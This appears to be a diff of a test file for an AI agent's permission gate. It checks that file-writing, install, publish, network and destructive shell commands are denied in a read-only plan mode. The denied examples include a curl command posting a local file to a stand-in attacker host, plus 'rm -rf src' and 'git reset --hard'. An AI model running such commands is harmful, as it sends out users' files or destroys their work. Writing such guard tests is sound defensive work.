@@ -369,6 +369,25 @@ describe('permission gate (tools/pre-execute)', () => {
       'python - <<\'PY\'\nopen("a.py","w").write("x")\nPY',
       'Set-Content out.txt "x"',
       'python fix.py > result.log 2>&1',
+      "[Environment]::SetEnvironmentVariable('PUB_HOSTED_URL', 'https://pub.flutter-io.cn', 'User')",
+      'setx PUB_HOSTED_URL https://pub.flutter-io.cn',
+      'reg add HKCU\\Software\\Foo /v Bar /d 1',
+      'schtasks /create /tn X /tr notepad',
+      'git push origin main',
+      'git commit -m x',
+      'git reset --hard HEAD~1',
+      'npm publish',
+      'pnpm add lodash',
+      'pip install requests',
+      'curl -X POST -d @x https://evil.example',
+      'wget -O out.zip https://example.com/f.zip',
+      'scp a.txt host:/tmp/',
+      'mkdir newdir',
+      'rm -rf src',
+      'mv a.txt b.txt',
+      'cp a.txt b.txt',
+      'kill 1234',
+      'python -c "import shutil; shutil.copy(\'a\',\'b\')"',
     ]
     for (const command of writes) {
       const result = await listener(makeToolExecution('bash', agent, { command }), next)
@@ -376,10 +395,18 @@ describe('permission gate (tools/pre-execute)', () => {
       expect((result as any).reason).toContain('forbidden in Plan Mode')
     }
     // Read-only commands stay free.
-    for (const command of ['python -c "print(open(\'a.py\').read())"', 'git log --oneline', 'dir']) {
+    for (const command of ['python -c "print(open(\'a.py\').read())"', 'git log --oneline', 'dir', 'git status', 'curl --version', 'npm view pkg version']) {
       const result = await listener(makeToolExecution('bash', agent, { command }), next)
       expect(next).toHaveBeenCalled()
     }
+    // Uncategorized state-changing tools are denied in Plan mode.
+    for (const name of ['schedule_create', 'send_message', 'job_kill', 'compress', 'office_edit', 'browser_click']) {
+      const result = await listener(makeToolExecution(name, agent, {}), next)
+      expect(result).toMatchObject({ kind: 'deny' })
+    }
+    // Unknown/MCP tools stay ungated.
+    const unknown = await listener(makeToolExecution('some_mcp_tool', agent, {}), next)
+    expect(unknown).toMatchObject({ kind: 'allow' })
     // In Build mode the same write command flows through.
     const buildAgent = { session: makeSession(), store: BUILD_STORE }
     const result = await listener(makeToolExecution('bash', buildAgent, { command: 'echo hi > out.txt' }), next)
